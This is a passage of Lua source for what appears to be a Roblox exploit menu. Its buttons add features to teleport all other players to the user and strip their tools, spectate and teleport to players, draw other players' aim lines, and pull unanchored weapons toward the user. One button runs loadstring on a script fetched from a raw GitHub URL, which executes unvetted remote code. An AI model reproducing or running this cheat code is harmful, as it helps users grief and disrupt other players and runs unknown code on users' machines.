    SliderButton.Position = UDim2.new(percent, -10, 0.5, -10)
    local newFOV = math.floor(50 + percent * 400)
    Environment.FOVSettings.Amount = newFOV
    FOVLabel.Text = "FOV: " .. newFOV
end

SliderButton.MouseButton1Down:Connect(function()
    dragging = true
end)

UIS.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)

UIS.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local percent = (UIS:GetMouseLocation().X - SliderBack.AbsolutePosition.X) / SliderBack.AbsoluteSize.X
        updateFOV(percent)
    end
end)

-- Toggle FOV visibility
ToggleButton.MouseButton1Click:Connect(function()
    Environment.FOVSettings.Visible = not Environment.FOVSettings.Visible
    if Environment.FOVSettings.Visible then
        ToggleButton.Text = "FOV: Visible"
        ToggleButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
    else
        ToggleButton.Text = "FOV: Hidden"
        ToggleButton.BackgroundColor3 = Color3.fromRGB(170, 0, 0)
    end
end)

-- Initial setup
updateFOV((Environment.FOVSettings.Amount - 50) / 400)
end)

addMainMenuButton("FADED GUI UNIVERSAL (MONSY)", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/NighterEpic/Faded-Grid/main/YesEpic", true))()
end)

addMainMenuButton("LOOP BRING ALL [3KTG]", function()
	--// Services
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

--// Variables
local loopEnabled = false
local originalPositions = {}

--// GUI
local ScreenGui = Instance.new("ScreenGui", game.CoreGui)

local Frame = Instance.new("Frame", ScreenGui)
Frame.Size = UDim2.new(0, 300, 0, 100)
Frame.Position = UDim2.new(0.5, -150, 0, 50)
Frame.BackgroundColor3 = Color3.fromRGB(255,255,255) -- all black
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Draggable = true

local UICorner = Instance.new("UICorner", Frame)
UICorner.CornerRadius = UDim.new(0, 6)

local Title = Instance.new("TextLabel", Frame)
Title.Size = UDim2.new(1, 0, 0.4, 0)
Title.BackgroundTransparency = 1
Title.Font = Enum.Font.SourceSansBold
Title.TextSize = 18
Title.Text = "PUBLIC ENEMY LOOP BRING ALL"
Title.TextColor3 = Color3.fromRGB(0,0,0) -- white

local StatusButton = Instance.new("TextButton", Frame)
StatusButton.Size = UDim2.new(1, 0, 0.6, 0)
StatusButton.Position = UDim2.new(0, 0, 0.4, 0)
StatusButton.Font = Enum.Font.SourceSansBold
StatusButton.TextSize = 20
StatusButton.Text = "OFF"
StatusButton.BackgroundColor3 = Color3.fromRGB(255,255,255) -- black
StatusButton.TextColor3 = Color3.fromRGB(0,0,0) -- white text

--// Toggle Function
StatusButton.MouseButton1Click:Connect(function()
    loopEnabled = not loopEnabled

    if loopEnabled then
        -- Save original positions
        originalPositions = {}
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                originalPositions[plr.Name] = plr.Character.HumanoidRootPart.CFrame
            end
        end

        StatusButton.Text = "ON"
        StatusButton.TextColor3 = Color3.fromRGB(0,0,0) -- green text
    else
        -- Return players to original positions
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                local savedPos = originalPositions[plr.Name]
                if savedPos then
                    plr.Character.HumanoidRootPart.CFrame = savedPos
                end
            end
        end

        StatusButton.Text = "OFF"
        StatusButton.TextColor3 = Color3.fromRGB(0,0,0) -- back to white text
    end
end)

--// Loop Bring All in Front
RunService.RenderStepped:Connect(function()
    if loopEnabled and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
        local hrp = LocalPlayer.Character.HumanoidRootPart
        local targetPos = hrp.Position + (hrp.CFrame.LookVector * 5)

        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                -- Remove tools
                plr.Backpack:ClearAllChildren()
                for _, tool in pairs(plr.Character:GetChildren()) do
                    if tool:IsA("Tool") then
                        tool:Destroy()
                    end
                end

                -- Bring to front
                plr.Character.HumanoidRootPart.CFrame = CFrame.new(targetPos)
            end
        end
    end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("PLAYER SCANNER (MONSY)", function()
	--// PUBLIC ENEMY PLAYER SCANNER
-- Solid black GUI + Modern font + Hover effects + Click animations + Working VIEW/UNVIEW/TELEPORT

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local UIS = game:GetService("UserInputService")

-- Main ScreenGui
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn = false

-- Main Frame
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 350, 0, 400)
MainFrame.Position = UDim2.new(0.5, -175, 0.5, -200)
MainFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
MainFrame.BorderSizePixel = 0
MainFrame.Visible = true
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Parent = ScreenGui

-- UI Corner
local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 8)
MainCorner.Parent = MainFrame

-- Title
local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 40)
Title.BackgroundTransparency = 1
Title.Text = "PUBLIC ENEMY PLAYER SCANNER"
Title.TextColor3 = Color3.fromRGB(0,0,0)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 20
Title.Parent = MainFrame

-- Scan Button
local ScanButton = Instance.new("TextButton")
ScanButton.Size = UDim2.new(0.9, 0, 0, 35)
ScanButton.Position = UDim2.new(0.05, 0, 0, 50)
ScanButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
ScanButton.TextColor3 = Color3.fromRGB(0,0,0)
ScanButton.Font = Enum.Font.GothamBold
ScanButton.TextSize = 18
ScanButton.Text = "SCAN"
ScanButton.AutoButtonColor = false
ScanButton.Parent = MainFrame

local ScanCorner = Instance.new("UICorner")
ScanCorner.CornerRadius = UDim.new(0, 6)
ScanCorner.Parent = ScanButton

-- Hover effect
local function AddHoverEffect(button)
	button.MouseEnter:Connect(function()
		button.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	end)
	button.MouseLeave:Connect(function()
		button.BackgroundColor3 = Color3.fromRGB(255,255,255)
	end)
	button.MouseButton1Click:Connect(function()
		button.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
		task.wait(0.1)
		button.BackgroundColor3 = Color3.fromRGB(255,255,255)
	end)
end
AddHoverEffect(ScanButton)

-- Scrollable Player List
local PlayerListFrame = Instance.new("ScrollingFrame")
PlayerListFrame.Size = UDim2.new(0.9, 0, 0, 280)
PlayerListFrame.Position = UDim2.new(0.05, 0, 0, 90)
PlayerListFrame.BackgroundTransparency = 1
PlayerListFrame.BorderSizePixel = 0
PlayerListFrame.ScrollBarThickness = 6
PlayerListFrame.ScrollBarImageColor3 = Color3.fromRGB(0, 0, 0)
PlayerListFrame.Parent = MainFrame

local UIListLayout = Instance.new("UIListLayout")
UIListLayout.Parent = PlayerListFrame
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.Padding = UDim.new(0, 4)

-- Function to create each player entry
local function CreatePlayerButton(player)
	local PlayerButton = Instance.new("TextButton")
	PlayerButton.Size = UDim2.new(1, 0, 0, 30)
	PlayerButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	PlayerButton.TextColor3 = Color3.fromRGB(0,0,0)
	PlayerButton.Font = Enum.Font.Gotham
	PlayerButton.TextSize = 16
	PlayerButton.Text = player.DisplayName .. " (@" .. player.Name .. ")"
	PlayerButton.AutoButtonColor = false
	PlayerButton.Parent = PlayerListFrame

	local PlayerCorner = Instance.new("UICorner")
	PlayerCorner.CornerRadius = UDim.new(0, 6)
	PlayerCorner.Parent = PlayerButton

	AddHoverEffect(PlayerButton)

	-- Actions Frame
	local ActionsFrame = Instance.new("Frame")
	ActionsFrame.Size = UDim2.new(1, 0, 0, 30)
	ActionsFrame.BackgroundTransparency = 1
	ActionsFrame.Visible = false
	ActionsFrame.Parent = PlayerListFrame

	local function CreateActionButton(text)
		local Btn = Instance.new("TextButton")
		Btn.Size = UDim2.new(0.3, 0, 1, 0)
		Btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
		Btn.TextColor3 = Color3.fromRGB(0,0,0)
		Btn.Font = Enum.Font.GothamBold
		Btn.TextSize = 14
		Btn.Text = text
		Btn.AutoButtonColor = false
		Btn.Parent = ActionsFrame

		local BtnCorner = Instance.new("UICorner")
		BtnCorner.CornerRadius = UDim.new(0, 6)
		BtnCorner.Parent = Btn

		AddHoverEffect(Btn)
		return Btn
	end

	local ViewBtn = CreateActionButton("VIEW")
	local UnviewBtn = CreateActionButton("UNVIEW")
	local TeleportBtn = CreateActionButton("TELEPORT")

	ViewBtn.Position = UDim2.new(0, 0, 0, 0)
	UnviewBtn.Position = UDim2.new(0.35, 0, 0, 0)
	TeleportBtn.Position = UDim2.new(0.7, 0, 0, 0)

	-- === BUTTON FUNCTIONS ===
	ViewBtn.MouseButton1Click:Connect(function()
		if player.Character and player.Character:FindFirstChild("Head") then
			workspace.CurrentCamera.CameraSubject = player.Character:FindFirstChild("Head")
		end
	end)

	UnviewBtn.MouseButton1Click:Connect(function()
		if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
			workspace.CurrentCamera.CameraSubject = LocalPlayer.Character:FindFirstChild("Humanoid")
		end
	end)

	TeleportBtn.MouseButton1Click:Connect(function()
		if player.Character and player.Character:FindFirstChild("HumanoidRootPart") and
		   LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
			LocalPlayer.Character.HumanoidRootPart.CFrame =
				player.Character.HumanoidRootPart.CFrame + Vector3.new(2, 0, 0)
		end
	end)

	-- Show/hide action buttons
	PlayerButton.MouseButton1Click:Connect(function()
		ActionsFrame.Visible = not ActionsFrame.Visible
	end)
end

-- SCAN function
ScanButton.MouseButton1Click:Connect(function()
	for _, child in ipairs(PlayerListFrame:GetChildren()) do
		if child:IsA("TextButton") or child:IsA("Frame") then
			child:Destroy()
		end
	end

	task.spawn(function()
		for _, player in ipairs(Players:GetPlayers()) do
			if player ~= LocalPlayer then
				CreatePlayerButton(player)
				task.wait(0.15)
			end
		end
	end)
end)

-- Hide/Unhide with U
UIS.InputBegan:Connect(function(input, gp)
	if not gp and input.KeyCode == Enum.KeyCode.U then
		MainFrame.Visible = not MainFrame.Visible
	end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("AIM VIEWER (MONSY)", function()
	--// PUBLIC ENEMY AIM VIEWER //--

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")
local Camera = workspace.CurrentCamera

local AimViewerEnabled = false
local playerLines = {}
local lineDistance = 50 -- haba ng line (studs)

-- GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = game.CoreGui

local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 200, 0, 60)
Frame.Position = UDim2.new(0.4, 0, 0.05, 0)
Frame.BackgroundColor3 = Color3.fromRGB(255,255,255) -- black bg
Frame.BorderSizePixel = 2
Frame.Active = true
Frame.Draggable = true
Frame.Parent = ScreenGui

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 25)
Title.BackgroundColor3 = Color3.fromRGB(255,255,255) -- black title bg
Title.Text = "PUBLIC ENEMY AIM VIEWER"
Title.TextColor3 = Color3.fromRGB(0,0,0) -- white text
Title.Font = Enum.Font.SourceSansBold
Title.TextSize = 18
Title.Parent = Frame

local ToggleButton = Instance.new("TextButton")
ToggleButton.Size = UDim2.new(1, 0, 0, 35)
ToggleButton.Position = UDim2.new(0, 0, 0, 25)
ToggleButton.BackgroundColor3 = Color3.fromRGB(255,255,255) -- black bg
ToggleButton.Text = "Aim Viewer: OFF"
ToggleButton.TextColor3 = Color3.fromRGB(0,0,0) -- red text (off)
ToggleButton.Font = Enum.Font.SourceSansBold
ToggleButton.TextSize = 18
ToggleButton.Parent = Frame

-- Function para gumawa ng line
local function createLine()
    local line = Drawing.new("Line")
    line.Thickness = 1.5
    line.Transparency = 1
    line.Color = Color3.fromRGB(0, 0, 0) -- black line
    return line
end

-- Toggle function
ToggleButton.MouseButton1Click:Connect(function()
    AimViewerEnabled = not AimViewerEnabled
    if AimViewerEnabled then
        ToggleButton.Text = "Aim Viewer: ON"
        ToggleButton.TextColor3 = Color3.fromRGB(0,0,0) -- green kapag on
    else
        ToggleButton.Text = "Aim Viewer: OFF"
        ToggleButton.TextColor3 = Color3.fromRGB(0,0,0) -- red kapag off
        for _, line in pairs(playerLines) do
            line.Visible = false
        end
    end
end)

-- Main loop
RunService.RenderStepped:Connect(function()
    if AimViewerEnabled then
        for _, plr in pairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer then
                if not playerLines[plr] then
                    playerLines[plr] = createLine()
                end
                local line = playerLines[plr]
                local char = plr.Character
                if char and char:FindFirstChild("Head") then
                    local head = char.Head
                    local startPos, onScreen = Camera:WorldToViewportPoint(head.Position)
                    local endPos = head.Position + (head.CFrame.LookVector * lineDistance)
                    local endScreen, onScreen2 = Camera:WorldToViewportPoint(endPos)
                    if onScreen or onScreen2 then
                        line.From = Vector2.new(startPos.X, startPos.Y)
                        line.To = Vector2.new(endScreen.X, endScreen.Y)
                        line.Visible = true
                    else
                        line.Visible = false
                    end
                else
                    line.Visible = false
                end
            end
        end
    end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("HEAD DETECTOR (MONSY)", function()
	-- Local Anti-Headshot Detection GUI (Client-Side)
-- Detects if someone is aiming at your head
-- With ON/OFF toggle button + Hotkey (G)

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local UserInputService = game:GetService("UserInputService")

-- SETTINGS
local FOV_THRESHOLD = 5 -- degrees: smaller = stricter
local UPDATE_INTERVAL = 0.2 -- seconds
local detectionEnabled = true -- toggle state

-- ScreenGui Setup
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "AntiHeadshotGUI"
ScreenGui.Parent = game.CoreGui

-- Main Frame
local Frame = Instance.new("Frame", ScreenGui)
Frame.Size = UDim2.new(0, 300, 0, 200)
Frame.Position = UDim2.new(1, -310, 0, 10)
Frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
Frame.BorderSizePixel = 0

-- Title
local Title = Instance.new("TextLabel", Frame)
Title.Size = UDim2.new(1, 0, 0, 30)
Title.BackgroundColor3 = Color3.fromRGB(255,255,255)
Title.TextColor3 = Color3.fromRGB(0,0,0)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 18
Title.Text = "Taong Goma Head Detector"

-- Player List
local PlayerList = Instance.new("TextLabel", Frame)
PlayerList.Size = UDim2.new(1, -10, 1, -40)
PlayerList.Position = UDim2.new(0, 5, 0, 35)
PlayerList.BackgroundTransparency = 1
PlayerList.TextColor3 = Color3.fromRGB(0,0,0)
PlayerList.Font = Enum.Font.Code
PlayerList.TextSize = 14
PlayerList.TextXAlignment = Enum.TextXAlignment.Left
PlayerList.TextYAlignment = Enum.TextYAlignment.Top
PlayerList.Text = "No threats detected."
PlayerList.RichText = true

-- Warning Label (Top Center)
local WarningLabel = Instance.new("TextLabel", ScreenGui)
WarningLabel.Size = UDim2.new(1, 0, 0, 30)
WarningLabel.Position = UDim2.new(0, 0, 0, 10)
WarningLabel.BackgroundTransparency = 1
WarningLabel.TextColor3 = Color3.fromRGB(0,0,0)
WarningLabel.TextStrokeTransparency = 0
WarningLabel.Font = Enum.Font.GothamBold
WarningLabel.TextSize = 20
WarningLabel.Text = ""
WarningLabel.Visible = false

-- Toggle Button
local ToggleButton = Instance.new("TextButton", Frame)
ToggleButton.Size = UDim2.new(1, 0, 0, 25)
ToggleButton.Position = UDim2.new(0, 0, 1, -25)
ToggleButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
ToggleButton.TextColor3 = Color3.fromRGB(0,0,0)
ToggleButton.Font = Enum.Font.GothamBold
ToggleButton.TextSize = 14
ToggleButton.Text = "Detection: ON"

-- Function to check aim
local function isAimingAtHead(attacker)
    if not attacker.Character or not attacker.Character:FindFirstChild("Head") then return false end
    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("Head") then return false end

    local attackerHead = attacker.Character.Head
    local localHead = LocalPlayer.Character.Head

    local lookDir = attackerHead.CFrame.LookVector
    local dirToOurHead = (localHead.Position - attackerHead.Position).Unit

    local dot = lookDir:Dot(dirToOurHead)
    local angle = math.deg(math.acos(dot))

    return angle <= FOV_THRESHOLD
end

-- Update loop
task.spawn(function()
    while true do
        task.wait(UPDATE_INTERVAL)

        if not detectionEnabled then
            PlayerList.Text = "Detection OFF"
            WarningLabel.Visible = false
            Title.BackgroundColor3 = Color3.fromRGB(255,255,255)
            continue
        end

        local threats = {}
        for _, plr in pairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer then
                if isAimingAtHead(plr) then
                    table.insert(threats, plr.Name)
                end
            end
        end

        if #threats > 0 then
            Title.BackgroundColor3 = Color3.fromRGB(255,255,255)
            PlayerList.Text = "⚠ Threats:\n" .. table.concat(threats, "\n")
            WarningLabel.Text = "⚠ WARNING: " .. table.concat(threats, ", ") .. " aiming at you!"
            WarningLabel.Visible = true
        else
            Title.BackgroundColor3 = Color3.fromRGB(255,255,255)
            PlayerList.Text = "No threats detected."
            WarningLabel.Visible = false
        end
    end
end)

-- Toggle function
local function toggleDetection()
    detectionEnabled = not detectionEnabled
    ToggleButton.Text = detectionEnabled and "Detection: ON" or "Detection: OFF"
end

-- Button Click
ToggleButton.MouseButton1Click:Connect(toggleDetection)

-- Hotkey (G)
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if not gameProcessed and input.KeyCode == Enum.KeyCode.G then
        toggleDetection()
    end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("PLAYER LIST TP (MONSY)", function()
	-- PUBLIC ENEMY - Player Viewer (LocalScript sa StarterGui)
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera

-- GUI parent
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "TaongGomaGui"
screenGui.ResetOnSpawn = false
screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

-- Toggle visibility keybind (K)
UserInputService.InputBegan:Connect(function(input, isProcessed)
	if not isProcessed and input.KeyCode == Enum.KeyCode.K then
		screenGui.Enabled = not screenGui.Enabled
	end
end)

-- Main draggable frame
local mainFrame = Instance.new("Frame", screenGui)
mainFrame.Size = UDim2.new(0, 520, 0, 360)
mainFrame.Position = UDim2.new(0.5, -260, 0.5, -180)
mainFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.BorderSizePixel = 0

-- Title bar
local titleBar = Instance.new("TextLabel", mainFrame)
titleBar.Size = UDim2.new(1, 0, 0, 36)
titleBar.BackgroundColor3 = Color3.fromRGB(255,255,255)
titleBar.Text = "PUBLIC ENEMY"
titleBar.Font = Enum.Font.GothamBold
titleBar.TextSize = 22
titleBar.TextColor3 = Color3.fromRGB(0,0,0)
titleBar.BorderSizePixel = 0

-- Left: player list (scrolling)
local leftWidth = 0.34
local scroll = Instance.new("ScrollingFrame", mainFrame)
scroll.Name = "PlayerList"
scroll.Position = UDim2.new(0, 0, 0, 36)
scroll.Size = UDim2.new(leftWidth, 0, 1, -36)
scroll.BackgroundColor3 = Color3.fromRGB(255,255,255)
scroll.ScrollBarThickness = 6
scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
scroll.BorderSizePixel = 0

local listLayout = Instance.new("UIListLayout", scroll)
listLayout.SortOrder = Enum.SortOrder.LayoutOrder
listLayout.Padding = UDim.new(0, 4)

-- Right: info + buttons
local right = Instance.new("Frame", mainFrame)
right.Position = UDim2.new(leftWidth, 0, 0, 36)
right.Size = UDim2.new(1 - leftWidth, 0, 1, -36)
right.BackgroundColor3 = Color3.fromRGB(255,255,255)
right.BorderSizePixel = 0

-- Center container for Name/Health
local infoContainer = Instance.new("Frame", right)
infoContainer.Size = UDim2.new(1, 0, 0.55, 0)
infoContainer.Position = UDim2.new(0, 0, 0, 8)
infoContainer.BackgroundTransparency = 1

local nameLabel = Instance.new("TextLabel", infoContainer)
nameLabel.Size = UDim2.new(1, -20, 0, 36)
nameLabel.Position = UDim2.new(0, 10, 0, 10)
nameLabel.BackgroundTransparency = 1
nameLabel.Font = Enum.Font.GothamBold
nameLabel.TextSize = 22
nameLabel.TextColor3 = Color3.fromRGB(0,0,0)
nameLabel.Text = "Name: None"
nameLabel.TextXAlignment = Enum.TextXAlignment.Center

local healthLabel = Instance.new("TextLabel", infoContainer)
healthLabel.Size = UDim2.new(1, -20, 0, 26)
healthLabel.Position = UDim2.new(0, 10, 0, 60)
healthLabel.BackgroundTransparency = 1
healthLabel.Font = Enum.Font.Gotham
healthLabel.TextSize = 18
healthLabel.TextColor3 = Color3.fromRGB(0,0,0)
healthLabel.Text = "Health: N/A"
healthLabel.TextXAlignment = Enum.TextXAlignment.Center

-- Buttons container
local buttonContainer = Instance.new("Frame", right)
buttonContainer.Size = UDim2.new(1, 0, 0.35, 0)
buttonContainer.Position = UDim2.new(0, 0, 0.6, 0)
buttonContainer.BackgroundTransparency = 1

local padding = Instance.new("UIPadding", buttonContainer)
padding.PaddingTop = UDim.new(0, 5)
padding.PaddingBottom = UDim.new(0, 5)

local btnLayout = Instance.new("UIListLayout", buttonContainer)
btnLayout.SortOrder = Enum.SortOrder.LayoutOrder
btnLayout.Padding = UDim.new(0, 8)
btnLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
btnLayout.VerticalAlignment = Enum.VerticalAlignment.Top

-- Button creator
local function createButton(label)
	local b = Instance.new("TextButton")
	b.Size = UDim2.new(0.85, 0, 0.22, 0)
	b.AnchorPoint = Vector2.new(0.5, 0)
	b.BackgroundColor3 = Color3.fromRGB(255,255,255)
	b.Font = Enum.Font.GothamBold
	b.TextSize = 18
	b.Text = label
	b.TextColor3 = Color3.fromRGB(0,0,0)
	b.AutoButtonColor = true
	local corner = Instance.new("UICorner")
	corner.CornerRadius = UDim.new(0, 8)
	corner.Parent = b
	b.Parent = buttonContainer
	return b
end

local viewButton = createButton("View Player")
local tpButton = createButton("Teleport to Player")
local bringButton = createButton("Bring Player") -- bagong button
local friendButton = createButton("Add Friend")

-- State
local selectedPlayer = nil
local isViewing = false
local isBringing = false
local originalCameraSubject = Camera.CameraSubject
local bringConnection

-- Helper: safely revert camera
local function revertCamera()
	if originalCameraSubject and typeof(originalCameraSubject) == "Instance" and originalCameraSubject.Parent then
		Camera.CameraSubject = originalCameraSubject
	else
		if LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
			Camera.CameraSubject = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
		end
	end
	Camera.CameraType = Enum.CameraType.Custom
	isViewing = false
	viewButton.Text = "View Player"
end

-- Build player list
local function refreshPlayerList()
	for _, c in ipairs(scroll:GetChildren()) do
		if c:IsA("TextButton") then c:Destroy() end
	end
	for _, plr in ipairs(Players:GetPlayers()) do
		if plr ~= LocalPlayer then
			local btn = Instance.new("TextButton")
			btn.Size = UDim2.new(1, -8, 0, 28)
			btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
			btn.TextColor3 = Color3.fromRGB(0,0,0)
			btn.Font = Enum.Font.Gotham
			btn.TextSize = 16
			btn.AutoButtonColor = true
			btn.Text = plr.Name
			local corner = Instance.new("UICorner")
			corner.CornerRadius = UDim.new(0, 4)
			corner.Parent = btn
			btn.Parent = scroll
			btn.MouseButton1Click:Connect(function()
				selectedPlayer = plr
				nameLabel.Text = "Name: " .. plr.Name
				local humanoid = plr.Character and plr.Character:FindFirstChildOfClass("Humanoid")
				if humanoid then
					healthLabel.Text = "Health: " .. math.floor(humanoid.Health)
				else
					healthLabel.Text = "Health: N/A"
				end
				if isViewing then revertCamera() end
			end)
		end
	end
end

-- Button behaviors
viewButton.MouseButton1Click:Connect(function()
	if not selectedPlayer then return end
	local char = selectedPlayer.Character
	local humanoid = char and char:FindFirstChildOfClass("Humanoid")
	if not humanoid then return end
	if not isViewing then
		originalCameraSubject = Camera.CameraSubject
		Camera.CameraSubject = humanoid
		Camera.CameraType = Enum.CameraType.Custom
		isViewing = true
		viewButton.Text = "Unview Player"
	else
		revertCamera()
	end
end)

tpButton.MouseButton1Click:Connect(function()
	if not selectedPlayer then return end
	local targetHRP = selectedPlayer.Character and selectedPlayer.Character:FindFirstChild("HumanoidRootPart")
	local myHRP = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
	if targetHRP and myHRP then
		myHRP.CFrame = targetHRP.CFrame + Vector3.new(2, 0.5, 0)
	end
end)

bringButton.MouseButton1Click:Connect(function()
	if not selectedPlayer then return end
	if not isBringing then
		isBringing = true
		bringButton.Text = "Unbring Player"
		bringConnection = RunService.RenderStepped:Connect(function()
			local targetChar = selectedPlayer.Character
			local myChar = LocalPlayer.Character
			if targetChar and myChar then
				local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
				local myHRP = myChar:FindFirstChild("HumanoidRootPart")
				if targetHRP and myHRP then
					targetHRP.CFrame = myHRP.CFrame + Vector3.new(2, 0, 0)
				end
			end
		end)
	else
		isBringing = false
		bringButton.Text = "Bring Player"
		if bringConnection then bringConnection:Disconnect() end
	end
end)

friendButton.MouseButton1Click:Connect(function()
	if selectedPlayer then
		LocalPlayer:RequestFriendship(selectedPlayer)
	end
end)

-- Keep health label updated
RunService.Heartbeat:Connect(function()
	if selectedPlayer then
		local humanoid = selectedPlayer.Character and selectedPlayer.Character:FindFirstChildOfClass("Humanoid")
		if humanoid then
			healthLabel.Text = "Health: " .. math.floor(humanoid.Health)
		else
			healthLabel.Text = "Health: N/A"
		end
	end
end)

Players.PlayerRemoving:Connect(function(plr)
	if plr == selectedPlayer then
		selectedPlayer = nil
		nameLabel.Text = "Name: None"
		healthLabel.Text = "Health: N/A"
		if isViewing then revertCamera() end
	end
	refreshPlayerList()
end)

Players.PlayerAdded:Connect(function()
	refreshPlayerList()
end)

refreshPlayerList()
end)

addMainMenuButton("TPUNANCHORED TO PLAYER (MONSY)", function()
	--// Services
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Workspace = game:GetService("Workspace")
local Debris = game:GetService("Debris")

--// GUI Setup
local ScreenGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
ScreenGui.Name = "UnanchoredToolTP"
ScreenGui.ResetOnSpawn = false

local Frame = Instance.new("Frame", ScreenGui)
Frame.Size = UDim2.new(0, 300, 0, 230)
Frame.Position = UDim2.new(0, 20, 0.5, -115)
Frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Draggable = true
Instance.new("UICorner", Frame)

local Title = Instance.new("TextLabel", Frame)
Title.Size = UDim2.new(1, 0, 0, 30)
Title.Text = "PUBLIC ENEMY UNANCHORED TP"
Title.TextColor3 = Color3.new(0,0,0)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 14
Title.BackgroundTransparency = 1

-- Username Input
local UsernameBox = Instance.new("TextBox", Frame)
UsernameBox.PlaceholderText = "Enter Player Username"
UsernameBox.Size = UDim2.new(1, -20, 0, 30)
UsernameBox.Position = UDim2.new(0, 10, 0, 40)
UsernameBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
UsernameBox.TextColor3 = Color3.new(0,0,0)
UsernameBox.Font = Enum.Font.Gotham
UsernameBox.TextSize = 14
UsernameBox.Text = ""
Instance.new("UICorner", UsernameBox)

-- Filter Label
local FilterLabel = Instance.new("TextLabel", Frame)
FilterLabel.Size = UDim2.new(1, -20, 0, 20)
FilterLabel.Position = UDim2.new(0, 10, 0, 80)
FilterLabel.Text = "Tool Filter:"
FilterLabel.TextColor3 = Color3.new(0,0,0)
FilterLabel.Font = Enum.Font.Gotham
FilterLabel.TextSize = 13
FilterLabel.BackgroundTransparency = 1

-- Filter Dropdown
local FilterDropdown = Instance.new("TextButton", Frame)
FilterDropdown.Size = UDim2.new(1, -20, 0, 30)
FilterDropdown.Position = UDim2.new(0, 10, 0, 100)
FilterDropdown.BackgroundColor3 = Color3.fromRGB(255,255,255)
FilterDropdown.Text = "All Tools"
FilterDropdown.TextColor3 = Color3.new(0,0,0)
FilterDropdown.Font = Enum.Font.Gotham
FilterDropdown.TextSize = 13
Instance.new("UICorner", FilterDropdown)

-- Cycle filter options
local filterModes = {"All Tools", "Guns Only", "Melee Only"}
local filterIndex = 1

FilterDropdown.MouseButton1Click:Connect(function()
	filterIndex = filterIndex + 1
	if filterIndex > #filterModes then
		filterIndex = 1
	end
	FilterDropdown.Text = filterModes[filterIndex]
end)

-- Filter logic
local function isToolAllowed(tool)
	local name = tool.Name:lower()

	if filterModes[filterIndex] == "All Tools" then
		return true
	elseif filterModes[filterIndex] == "Guns Only" then
		return name:find("gun") or name:find("pistol") or name:find("UZI") or name:find("silenced pistol") or name:find("desert deagle") or name:find("glock-17") or name:find("glock-19")
	elseif filterModes[filterIndex] == "Melee Only" then
		return name:find("knife") or name:find("bat") or name:find("knife") or name:find("blade") or name:find("crowbar")
	end

	return false
end

-- Main TP (tools fly to player)
local function teleportToolsToPlayer(targetPlayer)
	if not targetPlayer then
